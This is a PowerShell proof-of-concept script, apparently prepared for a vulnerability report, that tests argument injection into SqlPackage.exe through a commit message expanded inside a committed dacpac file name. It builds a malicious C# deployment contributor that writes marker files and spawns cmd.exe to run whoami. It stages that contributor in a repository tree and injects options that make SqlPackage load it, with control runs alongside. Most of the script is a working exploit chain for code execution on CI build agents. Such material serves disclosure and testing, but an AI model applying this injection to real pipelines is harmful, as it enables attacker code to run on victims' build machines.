# Ceiling probe 4. Does the injected argv reach an option that makes SqlPackage.exe RUN
# attacker code, rather than only write a file. Two legs plus controls, all local, synthetic
# markers only, no network target. Leg C is the one that decides the ceiling.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path $env:RUNNER_TEMP ("c4-" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path (Join-Path $work 'db')      | Out-Null
New-Item -ItemType Directory -Force -Path (Join-Path $work 'repo')    | Out-Null
New-Item -ItemType Directory -Force -Path (Join-Path $work 'victim')  | Out-Null
$repoDir   = Join-Path $work 'repo'
$victimDir = Join-Path $work 'victim'
Write-Output ("PSVersion : " + $PSVersionTable.PSVersion + "   PSEdition : " + $PSVersionTable.PSEdition)

$sqlPackage = (Get-ChildItem "C:\Program Files\Microsoft SQL Server\*\DAC\bin\SqlPackage.exe" | Select-Object -First 1).FullName
Write-Output ("SqlPackage.exe  : " + $sqlPackage + "  v" + (Get-Item $sqlPackage).VersionInfo.FileVersion)

$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @()
    foreach ($name in $names) {
        $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1
        Write-Host ("  lifted verbatim : $name lines $($f.Extent.StartLineNumber)-$($f.Extent.EndLineNumber)")
        $parts += $f.Extent.Text
    }
    return ($parts -join "`r`n")
}
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

# ---------------------------------------------------------------- option census
Write-Output ""
Write-Output "################ D. option census: every SqlPackage option that names a path or loads code"
$helpOut = & $sqlPackage /Action:Publish /? 2>&1 | Out-String
$censusFile = Join-Path $work 'sqlpackage-publish-help.txt'
Set-Content -Path $censusFile -Value $helpOut -Encoding UTF8
($helpOut -split "`r?`n") | Where-Object { $_ -match 'Contributor|DeployScriptPath|DiagnosticsFile|OutputPath|Profile|ReferencePath|Path' } | ForEach-Object { Write-Output ("  census> " + $_.Trim()) }

# ---------------------------------------------------------------- build the contributor
Write-Output ""
Write-Output "################ build a deployment contributor, the attacker-authored assembly"
$dacfxVer = (& $sqlPackage /version 2>&1 | Out-String).Trim()
Write-Output ("  SqlPackage /version : " + $dacfxVer)
$proj = Join-Path $work 'contrib'
New-Item -ItemType Directory -Force -Path $proj | Out-Null
$markerA = Join-Path $victimDir 'PWNED-inproc.txt'
$markerB = Join-Path $victimDir 'PWNED-childproc.txt'
$cs = @"
using System;
using System.IO;
using System.Diagnostics;
using Microsoft.SqlServer.Dac.Deployment;
using Microsoft.SqlServer.Dac.Extensibility;

namespace MsrcLab
{
    [ExportDeploymentPlanModifier(MarkerContributor.Id, "1.0.0.0")]
    public class MarkerContributor : DeploymentPlanModifier
    {
        public const string Id = "MsrcLab.MarkerContributor";
        static readonly string MarkerA = @"$markerA";
        static readonly string MarkerB = @"$markerB";
        protected override void OnExecute(DeploymentPlanContributorContext context)
        {
            try {
                string who = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                Process p = Process.GetCurrentProcess();
                File.WriteAllText(MarkerA,
                    "IN-PROCESS CODE EXECUTION INSIDE SqlPackage" + Environment.NewLine +
                    "process=" + p.ProcessName + " pid=" + p.Id + Environment.NewLine +
                    "identity=" + who + Environment.NewLine +
                    "image=" + p.MainModule.FileName + Environment.NewLine);
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c whoami > \"" + MarkerB + "\"");
                psi.UseShellExecute = false; psi.CreateNoWindow = true;
                Process.Start(psi).WaitForExit(20000);
            } catch (Exception ex) {
                File.WriteAllText(MarkerA + ".err", ex.ToString());
            }
        }
    }
}
"@
Set-Content -Path (Join-Path $proj 'Marker.cs') -Value $cs -Encoding UTF8
$csproj = @'
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <AssemblyName>MsrcLab.Contrib</AssemblyName>
    <Nullable>disable</Nullable>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Microsoft.SqlServer.DacFx" Version="170.*" />
  </ItemGroup>
</Project>
'@
Set-Content -Path (Join-Path $proj 'contrib.csproj') -Value $csproj -Encoding UTF8
Push-Location $proj
$build = & dotnet build -c Release -o (Join-Path $proj 'out') 2>&1 | Out-String
Pop-Location
($build -split "`r?`n") | Select-Object -Last 6 | ForEach-Object { Write-Output ("  build> " + $_.Trim()) }
$contribDir = Join-Path $proj 'out'
$contribDll = Join-Path $contribDir 'MsrcLab.Contrib.dll'
Write-Output ("  contributor dll : " + $contribDll + "  exists " + (Test-Path $contribDll))
# the attacker commits it, so stage it where a checked-out repo file would sit
if (Test-Path $contribDll) {
    Copy-Item $contribDll $repoDir -Force
    Write-Output ("  staged into the checked-out tree : " + ((Get-ChildItem $repoDir -Filter *.dll).Count) + " dll files")
}

# ---------------------------------------------------------------- seed a source database
& SqlLocalDB.exe create MSRCLAB4 2>&1 | Out-Null
& SqlLocalDB.exe start  MSRCLAB4 2>&1 | Out-Null
$target = '(localdb)\MSRCLAB4'
$ddl = @"
CREATE DATABASE SrcDb;
GO
USE SrcDb;
GO
CREATE TABLE dbo.[ZZMARKER_ATTACKER_AUTHORED_OBJECT] (id INT NOT NULL);
GO
"@
Set-Content -Path (Join-Path $work 'seed.sql') -Value $ddl -Encoding ASCII
& sqlcmd -S $target -i (Join-Path $work 'seed.sql') 2>&1 | Select-Object -First 3 | ForEach-Object { Write-Output ("  seed> " + $_) }
$srcDac = Join-Path $work 'db\Fab.dacpac'
& $sqlPackage '/Action:Extract' "/SourceServerName:$target" '/SourceDatabaseName:SrcDb' "/TargetFile:$srcDac" 2>&1 | Select-Object -Last 2 | ForEach-Object { Write-Output ("  extract> " + $_) }

function Reset-Markers {
    Remove-Item $markerA, ($markerA + '.err'), $markerB -Force -ErrorAction SilentlyContinue
}
function Show-Markers([string]$tag) {
    Write-Output ("  [$tag] IN-PROCESS MARKER  : " + (Test-Path $markerA))
    if (Test-Path $markerA) { (Get-Content $markerA) | ForEach-Object { Write-Output ("      > " + $_) } }
    if (Test-Path ($markerA + '.err')) { Write-Output ("      contributor threw:"); (Get-Content ($markerA + '.err')) | Select-Object -First 6 | ForEach-Object { Write-Output ("      ! " + $_) } }
    Write-Output ("  [$tag] CHILD PROCESS MARKER : " + (Test-Path $markerB))
    if (Test-Path $markerB) { (Get-Content $markerB) | ForEach-Object { Write-Output ("      > " + $_.Trim()) } }
}

# ---------------------------------------------------------------- C0 capability check, no injection
Write-Output ""
Write-Output "################ C0 CAPABILITY, direct argv, no injection: does SqlPackage load and run a contributor at all"
Reset-Markers
foreach ($cand in @($repoDir, $contribDll)) {
    Reset-Markers
    Write-Output ("  --- contributor path form : " + $cand)
    $o = & $sqlPackage '/Action:Publish' "/SourceFile:$srcDac" "/TargetServerName:$target" '/TargetDatabaseName:Fabrikam0' "/p:AdditionalDeploymentContributorPaths=$cand" "/p:AdditionalDeploymentContributors=MsrcLab.MarkerContributor" 2>&1 | Out-String
    ($o -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 12 | ForEach-Object { Write-Output ("    out> " + $_.Trim()) }
    Show-Markers 'C0'
    if (Test-Path $markerA) { $goodForm = $cand; break }
}
if (-not $goodForm) { $goodForm = $repoDir }
Write-Output ("  chosen contributor path form : " + $goodForm)

# ---------------------------------------------------------------- C1 through the injection
function RunLeg([string]$label, [string]$fileName, [string]$commitMsg) {
    Write-Host ""
    Write-Host "================ $label"
    Write-Host ("  committed file name : " + $fileName)
    Write-Host ("  commit message      : " + $commitMsg)
    $env:BUILD_SOURCEVERSIONMESSAGE = $commitMsg
    $dacpac = Join-Path $work ("db\" + $fileName)
    $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName $target -databaseName 'Fabrikam' -additionalArguments ''
    Write-Host ("  argument string     : " + $a)
    try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 10 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
}

Write-Output ""
Write-Output "################ C1 INJECT the contributor options through the committed file name"
Reset-Markers
$junk = Join-Path $work 'junk'
$msgC = '.dacpac" /p:AdditionalDeploymentContributorPaths="' + $goodForm + '" /p:AdditionalDeploymentContributors="MsrcLab.MarkerContributor" /DiagnosticsFile:"' + $junk
RunLeg 'C1 INJECT  /p:AdditionalDeploymentContributors' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msgC
Show-Markers 'C1'

Write-Output ""
Write-Output "################ C2 CONTROL, identical commit message, percent signs removed"
Reset-Markers
RunLeg 'C2 CONTROL percent signs removed' 'FabBUILD_SOURCEVERSIONMESSAGE.dacpac' $msgC
Show-Markers 'C2'

Write-Output ""
Write-Output "################ C3 CONTROL, percent form but no contributor options in the message"
Reset-Markers
$msgC3 = '.dacpac" /DiagnosticsFile:"' + $junk
RunLeg 'C3 CONTROL no contributor options' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msgC3
Show-Markers 'C3'

Write-Output ""
Write-Output "DONE"
exit 0
